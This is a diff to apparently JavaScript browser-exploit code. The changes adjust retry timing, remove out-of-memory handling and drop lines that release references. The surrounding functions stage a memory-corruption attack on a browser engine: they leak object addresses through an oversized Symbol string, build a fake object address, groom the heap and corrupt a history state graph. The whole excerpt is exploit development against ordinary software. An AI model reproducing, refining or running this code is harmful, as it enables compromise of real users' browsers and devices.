@@ -166,16 +166,14 @@ function releaseAttempt() {
   } catch {}
 }
 
-function retry(reason, safeToRelease, overrideDelay) {
+function retry(reason, safeToRelease) {
   const nextAttempt = attemptNumber + 1;
   emit("Retry", `${reason} attempt ${nextAttempt}`);
   if (safeToRelease) releaseAttempt();
-  const delay = overrideDelay !== undefined ? overrideDelay
-    : (safeToRelease ? 2000 : 50);
   setTimeout(() => {
     attemptNumber = nextAttempt;
     startAttempt();
-  }, delay);
+  }, safeToRelease ? 750 : 50);
 }
 
 function finishEarlySafeAttempt(reason, detail = "") {
@@ -298,7 +296,6 @@ function storeHistoryGraph() {
   outerGraph[CONTROL_INDEX] = -64000;
  
   history.replaceState(outerGraph, "");
-  outerGraph = null;
 }
 
 // Stage 2: leak fakeHost and targetHolder through the oversized Symbol string.
@@ -643,7 +640,6 @@ function finishAddressLeak() {
   const fakeAddress = hostAddress + 0x10;
   if (!plausibleCell(fakeAddress))
     return finishEarlySafeAttempt("Invalid fake object address", hex(hostAddress));
-  capturedString = null;
   groomHeap(fakeAddress, holderAddress);
 }
 
@@ -651,9 +647,7 @@ function finishAddressLeak() {
 function finishAttempt(outcome, holderAddress, fakeAddress) {
   if (outcome.status === "error") {
     emit("Failed", String(outcome.error?.message || outcome.error));
-    const isOom = outcome.safe &&
-      String(outcome.error?.message).toLowerCase().includes("deserializ");
-    return retry("Heap placement failed", outcome.safe, isOom ? 5000 : undefined);
+    return retry("Heap placement failed", outcome.safe);
   }
 
   if (outcome.status === "unchanged")
